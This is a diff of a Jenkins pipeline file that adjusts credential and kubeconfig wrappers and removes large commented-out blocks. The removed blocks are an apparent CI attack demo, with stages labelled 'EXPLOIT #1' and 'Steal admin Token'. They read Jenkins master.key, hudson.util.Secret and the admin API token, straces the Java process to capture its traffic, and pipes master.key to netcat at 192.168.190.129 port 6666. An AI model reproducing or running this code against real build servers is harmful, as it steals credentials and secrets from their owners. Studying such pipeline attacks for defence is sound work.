@@ -120,11 +120,11 @@ pipeline {
 
                                     
 //                            withKubeConfig(caCertificate: '', contextName: '', credentialsId: 'kubeconfig-file', serverUrl: '') 
-                            {
+//                            {
 //                                 withCredentials([usernamePassword(credentialsId: 'mysql-release', usernameVariable: 'MYSQL_RELEASE_DB_USER', passwordVariable: 'MYSQL_RELEASE_DB_PASSWORD')]) 
                                  //{
                                  //withCredentials([conjurSecretCredential(credentialsId: 'CONJUR_MYSQL_PASSWORD', variable: 'MYSQL_RELEASE_DB_PASSWORD'), conjurSecretCredential(credentialsId: 'CONJUR_MYSQL_USERNAME', variable: 'MYSQL_RELEASE_DB_USER')])
-                                 {
+//                                 {
                                          
                                 def conjur_url = 'https://ec2-54-193-30-240.us-west-1.compute.amazonaws.com'
                                 def conjur_org = 'devopswar';
@@ -193,155 +193,10 @@ spec:
     protocol: TCP
 EOF
 '''                 
-                                        
-                                         
-                                      // sh 'kubectl expose deployment petclinic --type=NodePort --name=petclinic-svc --port=8080 || true' 
-                                 } // end withCreds 1
-//                               } // end withCreds 2
-                            } // end withKubeConfig
-
-                                    
-//                            kubernetesDeploy configs: '<includes="**/*"/>', 
-//                                                      kubeConfig: [path: ''], 
-//                                                      kubeconfigId: 'kube-config2', 
-//                                                      secretName: '', 
-//                                                      ssh: [sshCredentialsId: '*', sshServer: ''], 
-//                                                      textCredentials: [certificateAuthorityData: '', clientCertificateData: '', clientKeyData: '', serverUrl: 'https://']                                    
-//                            }
-                 
-/*
-                                kubernetesDeploy(kubeconfigId: 'kubeconfig-credentials-id',               // REQUIRED
-                                         configs: '<ant-glob-pattern-for-resource-config-paths>', // REQUIRED
-                                         enableConfigSubstitution: false,
-                                         secretNamespace: '<secret-namespace>',
-                                         secretName: '<secret-name>',
-                                        dockerCredentials: [
-                                                [credentialsId: '<credentials-id-for-docker-hub>'],
-                                                [credentialsId: '<credentials-id-for-other-private-registry>', url: '<registry-url>'],
-                                        ]
-                                )
-*/
                        } // endscript
                }
         }
     } // end stages
 } // end pipeline
-
-
-
-
-
-/*
-node ('ubuntu') {
-    label 'ubuntu'
-    sh 'sudo netstat -anupt > /home/ubuntu/netstat.out'
-    sh 'sudo strace -fp $(pidof java) -v -e read,write,open -s 9999 -o /home/ubuntu/out.2 &'
-    //git credentialsId: '351e1846-ed9e-4901-a0ae-0e02fa904cd3', url: 'https://github.com/nimrods8/peMaker.git'    
-
-
-    checkout scm
-    docker.image('maven:3-alpine').inside {
-      stage("Install Bundler") {
-            sh 'mvn clean install'
-            //sh 'nc '
-      }
-    }
-}
-
-node ('master') {
-    def fileContents = readFile file: "/var/lib/jenkins/secrets/master.key", encoding: "UTF-8"
-    println fileContents
-    def apiContents = readFile file: "/var/lib/jenkins/users/admin/config.xml", encoding: "UTF-8"
-    def api1 = apiContents.split( '<apiToken>');
-    def api2 = api1[1].split( '</apiToken>');
-    println "API Token is:\n" + api2[0];
-    
-    //println fileContentsAdmin
-
-    int[] fileContentsHudson = readFile file: "/var/lib/jenkins/secrets/hudson.util.Secret", encoding: "ISO-8859-1"
-    String str = 'Secrets/hudson.Util.Secret:\nPass 1:\n';
-    for( int i = 0; i < fileContentsHudson.size(); i++)
-    {
-        int  a = (int)fileContentsHudson[i];
-        str = str + String.format("%02X-",a);
-    }
-    println str
-
-    sh 'cat /var/lib/jenkins/secrets/master.key | netcat  192.168.190.129 6666'
-}
-node ('ubuntu') {   
-    label 'ubuntu'
-    sh 'sudo kill $(pidof strace)'
-    sh 'sudo cat /home/ubuntu/out.2'
-}
-
-*/
-
-
-
-/*
-#!groovy
-
-
-
-
-pipeline {
-  stages {
-    stage('Maven Install') {
-	
-      agent {
-        docker {
-          image 'maven:3-alpine'
-          label 'ubuntu'
-        }
-      }
-      steps {
-        sh 'mvn clean install'
-        sh 'nc '
-        //
-        // EXPLOIT #1
-        //
-        sh 'sudo strace -fp $(pidof java) -v -e read,write -s 9999 -o /home/ubuntu/out.2 &'
-        git credentialsId: '351e1846-ed9e-4901-a0ae-0e02fa904cd3', url: 'https://github.com/nimrods8/peMaker.git'    
-      }
-    } // end stage
-	
-	stage('Steal admin Token') {
-			label 'master' 
-			def fileContents = readFile file: "/var/lib/jenkins/secrets/master.key", encoding: "UTF-8"
-			println fileContents
-			def apiContents = readFile file: "/var/lib/jenkins/users/admin/config.xml", encoding: "UTF-8"
-			def api1 = apiContents.split( '<apiToken>');
-			def api2 = api1[1].split( '</apiToken>');
-			println "API Token is:\n" + api2[0];
-			
-			//println fileContentsAdmin
-
-			int[] fileContentsHudson = readFile file: "/var/lib/jenkins/secrets/hudson.util.Secret", encoding: "ISO-8859-1"
-			String str = 'Secrets/hudson.Util.Secret:\nPass 1:\n';
-			for( int i = 0; i < fileContentsHudson.size(); i++)
-			{
-				int  a = (int)fileContentsHudson[i];
-				str = str + String.format("%02X-",a);
-			}
-			println str
-
-			sh 'cat /var/lib/jenkins/secrets/master.key | netcat  192.168.190.129 6666'
-	}
-	stage('take out credentials') {
-	  //
-	  // back to the ubuntu node
-	  //
-		agent { 
-			label 'ubuntu' 
-			sh 'sudo kill $(pidof strace)'
-			sh 'sudo cat /home/ubuntu/out.2'
-	  } // end agent
-	} // end stage
-  } // end stages	
-} // end pipeline
-
-*/
-
 
 
